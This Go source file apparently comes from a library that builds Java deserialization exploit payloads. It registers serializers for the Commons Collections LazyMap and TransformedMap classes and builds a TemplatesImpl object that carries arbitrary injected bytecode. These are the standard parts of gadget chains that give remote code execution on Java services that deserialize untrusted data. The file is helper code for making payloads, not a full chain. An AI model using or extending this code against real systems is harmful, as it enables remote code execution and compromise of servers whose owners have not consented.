package serlib

import (
	serialize "goserja/impl"
	"goserja/java"
	"math/rand"
	"time"
)

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

var AppClassLoader *java.ClassLoader

var loader *java.ClassLoader

func loadClass(className string) *Class {
	return AppClassLoader.LoadClass(className)
}

func init() {
	AppClassLoader = java.NewClassLoader(nil)
	CommonsCollection3Jar.LoadJar(AppClassLoader)
	loader = AppClassLoader

	//注册writeObject

	loader.RegisterWriteObject(func(ser interface{}, obj *java.Object) {
		// LazyMap#writeObject
		//	out.defaultWriteObject();
		//  out.writeObject(map);
		js := ser.(*serialize.JavaSerializer)
		js.SetBlkMode(false)
		js.WriteAllTypeData(obj.Fields["factory"], obj.GetFieldDescriptor("factory"))
		js.SetBlkMode(true)
		js.WriteAllTypeData(obj.Fields["map"], obj.GetFieldDescriptor("map"))
	}, "org.apache.commons.collections.map.LazyMap")

	loader.RegisterWriteObject(func(ser interface{}, obj *java.Object) {
		// TransformedMap#writeObject
		//	out.defaultWriteObject();
		//  out.writeObject(map);
		js := ser.(*serialize.JavaSerializer)
		js.SetBlkMode(false)
		js.WriteAllTypeData(obj.Fields["keyTransformer"], obj.GetFieldDescriptor("keyTransformer"))
		js.WriteAllTypeData(obj.Fields["valueTransformer"], obj.GetFieldDescriptor("valueTransformer"))
		js.SetBlkMode(true)
		js.WriteAllTypeData(obj.Fields["map"], obj.GetFieldDescriptor("map"))
	}, "org.apache.commons.collections.map.TransformedMap")
}

func NewTemplesImpl(name string, bytecodes []byte) java.Object {
	class := java.TemplatesImplClass
	templates := class.NewInstance(nil)
	templates.Fields["_name"] = name
	templates.Fields["_bytecodes"] = [][]byte{bytecodes}
	return templates
}

func randomName(n int) string {
	rand.Seed(time.Now().UnixNano()) // 设置随机种子
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
